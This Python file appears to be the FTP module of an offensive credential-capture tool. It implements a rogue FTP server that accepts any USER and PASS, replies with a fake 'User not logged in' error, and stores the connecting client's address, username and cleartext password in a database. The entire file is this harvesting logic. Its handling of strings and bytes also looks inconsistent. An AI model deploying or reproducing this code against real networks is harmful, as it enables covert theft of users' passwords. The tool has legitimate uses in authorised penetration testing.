from utils import *
from socketserver import BaseRequestHandler
from packets import FTPPacket

class FTP(BaseRequestHandler):
	def handle(self):
		try:
			self.request.send(str(FTPPacket()))
			data = self.request.recv(1024)

			if data[0:4] == "USER":
				User = data[5:].strip()

				Packet = FTPPacket(Code="331",Message="User name okay, need password.")
				self.request.send(str(Packet))
				data = self.request.recv(1024)

			if data[0:4] == "PASS":
				Pass = data[5:].strip()

				Packet = FTPPacket(Code="530",Message="User not logged in.")
				self.request.send(str(Packet))
				data = self.request.recv(1024)

				SaveToDb({
					'module': 'FTP', 
					'type': 'Cleartext', 
					'client': self.client_address[0], 
					'user': User, 
					'cleartext': Pass, 
					'fullhash': User + ':' + Pass
				})

			else:
				Packet = FTPPacket(Code="502",Message="Command not implemented.")
				self.request.send(str(Packet))
				data = self.request.recv(1024)

		except Exception:
			pass